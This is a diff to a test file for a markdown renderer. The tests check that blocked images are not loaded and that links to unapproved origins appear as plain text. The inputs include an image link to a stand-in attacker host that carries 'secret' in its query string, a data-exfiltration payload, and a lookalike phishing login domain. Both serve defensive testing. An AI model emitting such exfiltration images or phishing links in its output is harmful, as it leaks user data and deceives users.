@@ -1,4 +1,4 @@
-import { imageGate, renderMarkdown } from '../src/render';
+import { imageGate, originGate, renderMarkdown } from '../src/render';
 
 describe('renderMarkdown', () => {
   it('renders markdown', () => {
@@ -29,12 +29,25 @@ describe('renderMarkdown', () => {
     expect(gate('data:image/png;base64,AAAA')).toBe(false);
   });
 
-  it('turns a blocked image into a plain link instead of loading it', () => {
+  it('does not load a blocked image, but shows where it points', () => {
     const html = renderMarkdown('![leak](https://attacker.example/x.png?q=secret)', () => false);
 
     expect(html).not.toContain('<img');
-    expect(html).toContain('href="https://attacker.example/x.png?q=secret"');
-    expect(html).toContain('>leak</a>');
+    expect(html).toContain('leak (https://attacker.example/x.png?q=secret)');
+  });
+
+  it('keeps links to allowed addresses clickable and shows any other link as text with its address', () => {
+    const links = originGate(['https://qhse-mcp.example.com'], 'https://qhse.example.com/app/');
+    const html = renderMarkdown(
+      '[report](/reports/7) [tool](https://qhse-mcp.example.com/files/1) [pay here](https://qhse.example.com.evil.test/login)',
+      () => false,
+      links
+    );
+
+    expect(html).toContain('href="/reports/7"'); // the product's own pages
+    expect(html).toContain('href="https://qhse-mcp.example.com/files/1"');
+    expect(html).not.toContain('evil.test/login"');
+    expect(html).toContain('pay here (https://qhse.example.com.evil.test/login)');
   });
 
   it('keeps allowed images and loads them without sending a referrer', () => {
@@ -45,7 +58,7 @@ describe('renderMarkdown', () => {
   });
 
   it('opens links in a new tab without access to the host page', () => {
-    const html = renderMarkdown('[docs](https://example.com)');
+    const html = renderMarkdown('[docs](https://example.com)', () => false, () => true);
 
     expect(html).toContain('target="_blank"');
     expect(html).toContain('rel="noopener noreferrer"');
